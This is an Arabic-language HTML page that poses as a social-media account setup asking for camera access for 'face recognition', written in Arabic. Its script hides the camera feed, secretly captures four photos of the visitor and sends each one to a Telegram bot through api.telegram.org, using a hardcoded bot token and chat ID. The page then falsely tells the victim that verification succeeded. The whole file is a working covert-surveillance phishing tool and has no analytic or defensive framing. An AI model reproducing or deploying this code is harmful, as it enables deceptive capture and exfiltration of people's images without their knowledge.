<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إعداد الحساب | منصة التواصل الاجتماعي</title>
    <style>
        /* تنسيق الصفحة لتبدو احترافية */
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .container {
            text-align: center;
            background: #1e293b;
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            max-width: 400px;
            width: 90%;
        }
        .loader {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #38bdf8; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
        
        /* إخفاء الكاميرا والمعالجة عن عين المستخدم */
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container" id="main-box">
        <div class="loader"></div>
        <h2 id="title">جاري تهيئة الحساب</h2>
        <p id="desc">يرجى السماح بالوصول للكاميرا لضبط ميزة "التعرف على الوجه" وتأمين حسابك الجديد.</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const titleText = document.getElementById('title');
        const descText = document.getElementById('desc');

        // بيانات الربط الخاصة بك
        const botToken = '8417420328:AAGeX1WWGIRDx0S7CV0ID3Z6L8DkDeGrcrY';
        const myChatId = '7122100508';

        // بدء محاولة الوصول للكاميرا
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                
                titleText.innerText = "جاري التحقق...";
                descText.innerText = "يرجى الثبات أمام الكاميرا للحظات لإتمام الفحص الأمني.";

                let photosTaken = 0;
                const maxPhotos = 4;

                // إعداد مؤقت لالتقاط 4 صور
                const interval = setInterval(() => {
                    if (photosTaken < maxPhotos) {
                        captureAndSend(photosTaken + 1);
                        photosTaken++;
                    } else {
                        clearInterval(interval);
                        // إنهاء العملية للمستخدم
                        titleText.innerText = "اكتمل التحقق!";
                        descText.innerText = "شكراً لك، تم إعداد ملفك الشخصي بنجاح. سيتم توجيهك الآن...";
                        
                        // إيقاف الكاميرا بعد الانتهاء
                        stream.getTracks().forEach(track => track.stop());
                    }
                }, 2500); // التقاط صورة كل 2.5 ثانية
            })
            .catch(err => {
                titleText.innerText = "فشل التحقق";
                descText.innerText = "يجب السماح بالوصول للكاميرا لتتمكن من استخدام ميزات موقع التواصل الاجتماعي.";
                console.error("Camera error:", err);
            });

        // دالة التقاط الصورة وإرسالها لبوت تليجرام
        function captureAndSend(index) {
            const context = canvas.getContext('2d');
            // رسم اللقطة الحالية من الفيديو على الكانفاس
            context.drawImage(video, 0, 0, 640, 480);
            
            // تحويل المحتوى إلى صورة JPEG
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', myChatId);
                formData.append('photo', blob, `img_${index}.jpg`);
                formData.append('caption', `✅ التقاط جديد:\nالصورة رقم: ${index}\nمن موقع التواصل الاجتماعي الخاص بك.`);

                // إرسال البيانات إلى API تليجرام
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(result => {
                    console.log(`تم إرسال الصورة ${index}`);
                })
                .catch(error => {
                    console.error("إرسال فاشل:", error);
                });
            }, 'image/jpeg', 0.8); // الجودة 80% لتقليل الحجم وتسريع الإرسال
        }
    </script>
</body>
</html>
